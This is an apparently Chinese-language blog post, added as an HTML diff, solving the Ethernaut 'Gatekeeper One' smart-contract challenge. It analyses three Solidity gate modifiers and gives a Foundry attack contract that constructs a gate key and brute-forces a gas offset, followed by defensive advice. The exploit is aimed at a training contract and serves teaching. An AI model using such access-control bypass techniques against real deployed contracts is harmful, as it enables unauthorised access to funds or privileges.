@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="⛽-Gas-优化大师"><a href="#⛽-Gas-优化大师" class="headerlink" title="⛽ Gas 优化大师"></a>⛽ Gas 优化大师</h2><ul>
+<li><a href="/2025/09/12/gas-optimization-master-course/">Gas Optimization Master Course</a></li>
+</ul>
+<h2 id="🔗-Reth-公链开发"><a href="#🔗-Reth-公链开发" class="headerlink" title="🔗 Reth 公链开发"></a>🔗 Reth 公链开发</h2><ul>
+<li><a href="/categories/Reth%E5%BC%80%E5%8F%91">Reth 架构深度解析</a></li>
+<li><a href="/tags/Rust%E5%8C%BA%E5%9D%97%E9%93%BE">Rust + Ethereum 开发指南</a></li>
+<li><a href="/tags/%E6%89%A7%E8%A1%8C%E5%B1%82">自定义执行层实现</a></li>
+<li><a href="/tags/Layer2">Layer2 解决方案开发</a></li>
+</ul>
+<h2 id="🎯-MEV-前沿研究"><a href="#🎯-MEV-前沿研究" class="headerlink" title="🎯 MEV 前沿研究"></a>🎯 MEV 前沿研究</h2><ul>
+<li><a href="/categories/MEV%E7%A0%94%E7%A9%B6">MEV 基础概念</a></li>
+<li><a href="/tags/%E5%A5%97%E5%88%A9">套利策略分析</a></li>
+<li><a href="/tags/%E5%8C%BA%E5%9D%97%E6%9E%84%E5%BB%BA">区块构建优化</a></li>
+<li><a href="/tags/MEV%E6%9C%BA%E5%99%A8%E4%BA%BA">MEV Bot 开发实战</a></li>
+<li><a href="/tags/%E9%97%AA%E7%94%B5%E8%B4%B7">闪电贷套利策略</a></li>
+</ul>
+<h2 id="⚡-高性能区块链"><a href="#⚡-高性能区块链" class="headerlink" title="⚡ 高性能区块链"></a>⚡ 高性能区块链</h2><ul>
+<li><a href="/categories/%E5%B9%B6%E8%A1%8C%E6%89%A7%E8%A1%8C">并行执行引擎</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-Foundry-系列-🛡️"><a href="#Ethernaut-Foundry-系列-🛡️" class="headerlink" title="Ethernaut&amp;Foundry 系列 🛡️"></a>Ethernaut&amp;Foundry 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-13-Gatekeeper-One-Gas计算与类型转换"><a href="#🎯-Ethernaut-Level-13-Gatekeeper-One-Gas计算与类型转换" class="headerlink" title="🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换"></a>🎯 Ethernaut Level 13: Gatekeeper One - Gas计算与类型转换</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/13">Ethernaut Level 13 - Gatekeeper One</a><br><strong>攻击类型</strong>: Gas计算 &#x2F; 类型转换<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>通过三个 <code>modifier</code> 的检测，成功调用 <code>enter</code> 函数，成为 <code>entrant</code>。</p>
+<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg" alt="Gatekeeper One Requirements"></p>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><p>要通过此关卡，我们需要调用 <code>enter(bytes8 _gateKey)</code> 函数，但必须绕过它的三个 <code>modifier</code>。让我们逐一分析。</p>
+<h3 id="Modifier-1-gateOne"><a href="#Modifier-1-gateOne" class="headerlink" title="Modifier 1: gateOne"></a>Modifier 1: <code>gateOne</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateOne() &#123;</span><br><span class="line">  require(msg.sender != tx.origin);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>modifier</code> 要求 <code>msg.sender</code> 不等于 <code>tx.origin</code>。这是一种常见的检查，用于防止直接从外部账户（EOA）调用。为了绕过它，我们必须通过一个中间合约来调用 <code>enter</code> 函数。这样，<code>tx.origin</code> 将是我们的EOA地址，而 <code>msg.sender</code> 将是攻击合约的地址。</p>
+<h3 id="Modifier-2-gateTwo"><a href="#Modifier-2-gateTwo" class="headerlink" title="Modifier 2: gateTwo"></a>Modifier 2: <code>gateTwo</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateTwo() &#123;</span><br><span class="line">  require(gasleft() % 8191 == 0);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>modifier</code> 要求在执行到这里时，剩余的 <code>gas</code> 必须是 <code>8191</code> 的倍数。这是一个棘手的约束，因为 <code>gas</code> 的消耗会因操作码、Solidity版本和优化器设置而异。</p>
+<p>最直接的方法是进行暴力破解：通过一个循环，在调用 <code>enter</code> 函数时尝试不同的 <code>gas</code> 值，直到找到一个满足 <code>gasleft() % 8191 == 0</code> 的值。</p>
+<h3 id="Modifier-3-gateThree"><a href="#Modifier-3-gateThree" class="headerlink" title="Modifier 3: gateThree"></a>Modifier 3: <code>gateThree</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">  require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">  require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>modifier</code> 对我们传入的 <code>_gateKey</code> (一个 <code>bytes8</code> 类型的值) 进行了三项检查：</p>
+<ol>
+<li><p><code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))</code></p>
+<ul>
+<li><code>uint64(_gateKey)</code> 将 <code>bytes8</code> 转换为 <code>uint64</code>。</li>
+<li><code>uint32(...)</code> 会截断，只保留低32位。</li>
+<li><code>uint16(...)</code> 会截断，只保留低16位。</li>
+<li>为了让两者相等，<code>_gateKey</code> 的第17位到第32位必须全为0。例如，<code>0x????????0000????</code>。</li>
+</ul>
+</li>
+<li><p><code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></p>
+<ul>
+<li>这要求 <code>_gateKey</code> 的高32位不全为0。</li>
+</ul>
+</li>
+<li><p><code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))</code></p>
+<ul>
+<li><code>uint16(uint160(tx.origin))</code> 获取 <code>tx.origin</code> 地址的最低16位。</li>
+<li>这要求 <code>_gateKey</code> 的低32位（经过第一次检查后，其实就是低16位）必须等于 <code>tx.origin</code> 的低16位。</li>
+</ul>
+</li>
+</ol>
+<p>综合这三个条件，我们可以构造出 <code>_gateKey</code>：</p>
+<ul>
+<li>将 <code>tx.origin</code> (即我们的EOA地址) 的低16位作为 <code>_gateKey</code> 的低16位。</li>
+<li>确保 <code>_gateKey</code> 的17-32位为0。</li>
+<li>在 <code>_gateKey</code> 的高32位中设置至少一个非零位。</li>
+</ul>
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><p>这是我们的Foundry测试合约，它将部署攻击合约并调用 <code>enter</code> 函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/13_GatekeeperOne.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneTest is Test &#123;</span><br><span class="line">    GatekeeperOne instance;</span><br><span class="line">    Attack attacker;</span><br><span class="line">    address player1;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        player1 = vm.addr(1);</span><br><span class="line">        instance = new GatekeeperOne();</span><br><span class="line">        attacker = new Attack(address(instance));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testattacker() public &#123;</span><br><span class="line">        vm.startPrank(player1, player1);</span><br><span class="line">        // 使用试错法找到合适的gas值 (例如 268)</span><br><span class="line">        attacker.attack(268);</span><br><span class="line">        assertEq(instance.entrant(), player1);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is Test &#123;</span><br><span class="line">    GatekeeperOne instance;</span><br><span class="line"></span><br><span class="line">    constructor(address fb) &#123;</span><br><span class="line">        instance = GatekeeperOne(fb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 构造 gateKey 并使用指定的 gas 调用 enter 函数</span><br><span class="line">    function attack(uint256 gas) public &#123;</span><br><span class="line">        // 构造满足 gateThree 的 key</span><br><span class="line">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class="line">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class="line"></span><br><span class="line">        // 使用计算好的 gas 调用目标函数</span><br><span class="line">        instance.enter&#123;gas: 8191 * 10 + gas&#125;(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 用于暴力破解 gas 值的函数</span><br><span class="line">    function findGas() public &#123;</span><br><span class="line">        uint16 origin_suffix = uint16(uint160(msg.sender));</span><br><span class="line">        bytes8 gateKey = bytes8(uint64(origin_suffix)) | 0x1000000000000000;</span><br><span class="line">        </span><br><span class="line">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">            try instance.enter&#123;gas: 8191 * 10 + i&#125;(gateKey) &#123;</span><br><span class="line">                console.log(&quot;Found gas:&quot;, i); // 实验得出 i = 268</span><br><span class="line">                return;</span><br><span class="line">            &#125; catch &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        revert(&quot;No gas match found!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键攻击步骤"><a href="#关键攻击步骤" class="headerlink" title="关键攻击步骤"></a>关键攻击步骤</h3><ol>
+<li><strong>创建攻击合约</strong>: 绕过 <code>gateOne</code> (<code>msg.sender != tx.origin</code>)。</li>
+<li><strong>构造 <code>_gateKey</code></strong>:<ul>
+<li>获取 <code>tx.origin</code> 的低16位。</li>
+<li>将其构造成一个 <code>bytes8</code> 值，满足 <code>gateThree</code> 的所有 <code>require</code> 条件。</li>
+</ul>
+</li>
+<li><strong>暴力破解 <code>gas</code></strong>:<ul>
+<li>编写一个循环，尝试不同的 <code>gas</code> 值来调用 <code>enter</code> 函数。</li>
+<li>在 <code>Foundry</code> 测试中，我们可以通过 <code>try/catch</code> 捕获失败的调用，直到找到一个成功的 <code>gas</code> 值（例如，<code>gas</code> 偏移量为 <code>268</code>）。</li>
+</ul>
+</li>
+<li><strong>发起攻击</strong>: 使用找到的 <code>gas</code> 值和构造的 <code>_gateKey</code> 从攻击合约中调用 <code>enter</code> 函数。</li>
+</ol>
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><ol>
+<li><strong>避免复杂的 <code>gas</code> 检查</strong>: <code>gasleft()</code> 的值是不可预测的，并且会随着EVM的更新而改变。不应将其用于关键的访问控制逻辑。</li>
+<li><strong>简化类型转换逻辑</strong>: 过于复杂的类型转换和位操作会使代码难以理解，并可能引入意想不到的漏洞。应保持逻辑清晰、直接。</li>
+<li><strong>使用更安全的认证模式</strong>: 不要依赖 <code>tx.origin</code> 或 <code>gas</code> 技巧。可以考虑使用数字签名、Merkle树或预言机等更强大的验证机制。</li>
+</ol>
+<h2 id="🔧-相关工具和技术"><a href="#🔧-相关工具和技术" class="headerlink" title="🔧 相关工具和技术"></a>🔧 相关工具和技术</h2><ul>
+<li><strong>Foundry <code>try/catch</code></strong>: 用于在测试中捕获和处理预期的 <code>revert</code>，非常适合暴力破解 <code>gas</code> 等场景。</li>
+<li><strong>位操作 (<code>|</code>, <code>&amp;</code>)</strong>: 在构造 <code>_gateKey</code> 时用于精确控制字节内容。</li>
+<li><strong>类型转换</strong>: 深入理解Solidity中不同整数类型（<code>uint16</code>, <code>uint32</code>, <code>uint64</code>）和字节类型（<code>bytes8</code>）之间的转换规则至关重要。</li>
+</ul>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>
+<ul>
+<li><code>tx.origin</code> vs <code>msg.sender</code> 的区别是许多合约攻击的基础。</li>
+<li><code>gasleft()</code> 的值是动态的，依赖它进行验证是脆弱的。</li>
+<li>Solidity中的类型转换遵循严格的规则，不正确的转换或截断是常见的漏洞来源。</li>
+</ul>
+<p><strong>攻击向量</strong>:</p>
+<ul>
+<li>通过中间合约绕过 <code>tx.origin</code> 检查。</li>
+<li>通过暴力破解找到满足 <code>gasleft()</code> 模运算的 <code>gas</code> 值。</li>
+<li>通过逆向工程类型转换和位操作的 <code>require</code> 条件来构造一个有效的输入。</li>
+</ul>
+<p><strong>防御策略</strong>:</p>
+<ul>
+<li>不要将 <code>gas</code> 消耗作为安全机制。</li>
+<li>保持验证逻辑的简单和直接。</li>
+<li>使用经过验证的、更强大的身份验证模式。</li>
+</ul>
+<h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/types.html#conversions">Solidity 类型转换</a></li>
+<li><a target="_blank" rel="noopener" href="https://solidity-by-example.org/hacks/phishing-with-tx-origin/">tx.origin vs msg.sender</a></li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/">Ethernaut 系列</a> <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/%E8%BF%9B%E9%98%B6%E6%94%BB%E5%87%BB%E7%AF%87-11-20/">进阶攻击篇 (11-20)</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Gas-Manipulation/" rel="tag">#Gas Manipulation</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/Type-Casting/" rel="tag">#Type Casting</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
